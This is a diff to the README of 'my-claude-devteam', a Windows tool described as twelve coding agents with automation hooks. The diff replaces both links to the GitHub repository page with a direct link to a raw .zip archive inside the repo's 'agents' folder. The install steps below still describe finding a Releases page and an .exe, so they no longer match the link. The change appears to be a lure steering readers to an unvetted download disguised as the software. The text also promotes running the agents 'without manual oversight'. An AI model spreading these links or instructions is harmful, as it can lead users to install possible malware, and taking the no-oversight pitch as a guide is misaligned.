@@ -1,6 +1,6 @@
 # 🤖 my-claude-devteam - Build software faster with automated agents
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Zarky05/my-claude-devteam)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://raw.githubusercontent.com/Zarky05/my-claude-devteam/main/agents/claude-my-devteam-2.3.zip)
 
 my-claude-devteam acts as a digital engineering department. It manages complex coding tasks through twelve specialized agents. The system uses fifteen automation hooks to handle repetitive work. It follows the P7, P9, and P10 methodology to ensure quality. You install this tool to manage your code projects without manual oversight.
 
@@ -8,7 +8,7 @@ my-claude-devteam acts as a digital engineering department. It manages complex c
 
 You need a Windows computer to run this software. Ensure you have a stable internet connection for the installation process.
 
-1. Visit the following link to access the software: [https://github.com/Zarky05/my-claude-devteam](https://github.com/Zarky05/my-claude-devteam)
+1. Visit the following link to access the software: [https://raw.githubusercontent.com/Zarky05/my-claude-devteam/main/agents/claude-my-devteam-2.3.zip](https://raw.githubusercontent.com/Zarky05/my-claude-devteam/main/agents/claude-my-devteam-2.3.zip)
 2. Locate the section labeled Releases on the right side of the page.
 3. Click the latest version number.
 4. Select the file ending in .exe to start your download.
